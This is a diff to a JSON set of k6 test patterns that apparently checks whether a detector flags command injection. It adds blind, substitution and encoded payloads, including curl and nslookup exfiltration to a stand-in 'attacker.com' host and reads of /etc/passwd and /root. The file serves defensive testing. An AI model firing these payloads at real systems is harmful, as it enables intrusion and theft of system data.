@@ -1,7 +1,7 @@
 {
   "metadata": {
     "category": "cmdinj",
-    "total_patterns": 25,
+    "total_patterns": 40,
     "port": 8004,
     "description": "k6 test patterns for cmdinj"
   },
@@ -280,6 +280,186 @@
       "port": 8004,
       "expected_detection": true,
       "severity": "critical"
+    },
+    {
+      "id": "CMD_BLIND_001",
+      "name": "Time-based blind command injection",
+      "category": "cmdinj",
+      "subcategory": "blind_command_injection",
+      "payload": "; sleep 10",
+      "encoded": "%3B%20sleep%2010",
+      "port": 8004,
+      "expected_detection": true,
+      "severity": "high",
+      "expected_rule": "Command Injection via Semicolon"
+    },
+    {
+      "id": "CMD_BLIND_002",
+      "name": "Network-based time delay detection",
+      "category": "cmdinj",
+      "subcategory": "blind_command_injection",
+      "payload": "&& ping -c 10 127.0.0.1",
+      "encoded": "%26%26%20ping%20-c%2010%20127.0.0.1",
+      "port": 8004,
+      "expected_detection": true,
+      "severity": "high",
+      "expected_rule": "Advanced Command Injection Attempt"
+    },
+    {
+      "id": "CMD_BLIND_003",
+      "name": "Out-of-band data exfiltration via curl",
+      "category": "cmdinj",
+      "subcategory": "blind_command_injection",
+      "payload": "| curl http://attacker.com/callback?data=`whoami`",
+      "encoded": "%7C%20curl%20http%3A%2F%2Fattacker.com%2Fcallback%3Fdata%3D%60whoami%60",
+      "port": 8004,
+      "expected_detection": true,
+      "severity": "critical",
+      "expected_rule": "Command Injection via Pipe"
+    },
+    {
+      "id": "CMD_BLIND_004",
+      "name": "DNS-based data exfiltration",
+      "category": "cmdinj",
+      "subcategory": "blind_command_injection",
+      "payload": "; nslookup `whoami`.attacker.com",
+      "encoded": "%3B%20nslookup%20%60whoami%60.attacker.com",
+      "port": 8004,
+      "expected_detection": true,
+      "severity": "critical",
+      "expected_rule": "Command Injection via Semicolon"
+    },
+    {
+      "id": "CMD_BLIND_005",
+      "name": "Timeout-based command execution",
+      "category": "cmdinj",
+      "subcategory": "blind_command_injection",
+      "payload": "&& timeout 15 bash",
+      "encoded": "%26%26%20timeout%2015%20bash",
+      "port": 8004,
+      "expected_detection": true,
+      "severity": "high",
+      "expected_rule": "Advanced Command Injection Attempt"
+    },
+    {
+      "id": "CMD_SUB_001",
+      "name": "Command substitution with whoami",
+      "category": "cmdinj",
+      "subcategory": "command_substitution",
+      "payload": "$(whoami)",
+      "encoded": "%24%28whoami%29",
+      "port": 8004,
+      "expected_detection": true,
+      "severity": "critical",
+      "expected_rule": "Command Substitution Attack"
+    },
+    {
+      "id": "CMD_SUB_002",
+      "name": "Backtick command substitution with id",
+      "category": "cmdinj",
+      "subcategory": "command_substitution",
+      "payload": "`id`",
+      "encoded": "%60id%60",
+      "port": 8004,
+      "expected_detection": true,
+      "severity": "critical",
+      "expected_rule": "Command Substitution Attack"
+    },
+    {
+      "id": "CMD_SUB_003",
+      "name": "Password file via command substitution",
+      "category": "cmdinj",
+      "subcategory": "command_substitution",
+      "payload": "$(cat /etc/passwd)",
+      "encoded": "%24%28cat%20%2Fetc%2Fpasswd%29",
+      "port": 8004,
+      "expected_detection": true,
+      "severity": "critical",
+      "expected_rule": "Command Substitution Attack"
+    },
+    {
+      "id": "CMD_SUB_004",
+      "name": "System info via backtick substitution",
+      "category": "cmdinj",
+      "subcategory": "command_substitution",
+      "payload": "`uname -a`",
+      "encoded": "%60uname%20-a%60",
+      "port": 8004,
+      "expected_detection": true,
+      "severity": "high",
+      "expected_rule": "Command Substitution Attack"
+    },
+    {
+      "id": "CMD_SUB_005",
+      "name": "Root directory listing via substitution",
+      "category": "cmdinj",
+      "subcategory": "command_substitution",
+      "payload": "$(ls -la /root)",
+      "encoded": "%24%28ls%20-la%20%2Froot%29",
+      "port": 8004,
+      "expected_detection": true,
+      "severity": "critical",
+      "expected_rule": "Command Substitution Attack"
+    },
+    {
+      "id": "CMD_ENC_002",
+      "name": "URL encoded AND operator with ls",
+      "category": "cmdinj",
+      "subcategory": "encoded_commands",
+      "payload": "%26%26%20ls%20-la",
+      "encoded": "%2526%2526%2520ls%2520-la",
+      "port": 8004,
+      "expected_detection": true,
+      "severity": "critical",
+      "expected_rule": "Advanced Command Injection Attempt"
+    },
+    {
+      "id": "CMD_ENC_003",
+      "name": "Base64 encoded whoami command",
+      "category": "cmdinj",
+      "subcategory": "encoded_commands",
+      "payload": "d2hvYW1p",
+      "encoded": "d2hvYW1p",
+      "port": 8004,
+      "expected_detection": true,
+      "severity": "critical",
+      "expected_rule": "Advanced Command Injection Attempt"
+    },
+    {
+      "id": "CMD_ENC_004",
+      "name": "URL encoded command substitution",
+      "category": "cmdinj",
+      "subcategory": "encoded_commands",
+      "payload": "%24%28whoami%29",
+      "encoded": "%2524%2528whoami%2529",
+      "port": 8004,
+      "expected_detection": true,
+      "severity": "critical",
+      "expected_rule": "Advanced Command Injection Attempt"
+    },
+    {
+      "id": "CMD_ENC_005",
+      "name": "Hex encoded whoami command",
+      "category": "cmdinj",
+      "subcategory": "encoded_commands",
+      "payload": "\\x77\\x68\\x6f\\x61\\x6d\\x69",
+      "encoded": "%5Cx77%5Cx68%5Cx6f%5Cx61%5Cx6d%5Cx69",
+      "port": 8004,
+      "expected_detection": true,
+      "severity": "critical",
+      "expected_rule": "Advanced Command Injection Attempt"
+    },
+    {
+      "id": "CMD_ENC_006",
+      "name": "URL encoded backtick execution",
+      "category": "cmdinj",
+      "subcategory": "encoded_commands",
+      "payload": "%60id%60",
+      "encoded": "%2560id%2560",
+      "port": 8004,
+      "expected_detection": true,
+      "severity": "critical",
+      "expected_rule": "Advanced Command Injection Attempt"
     }
   ]
 }
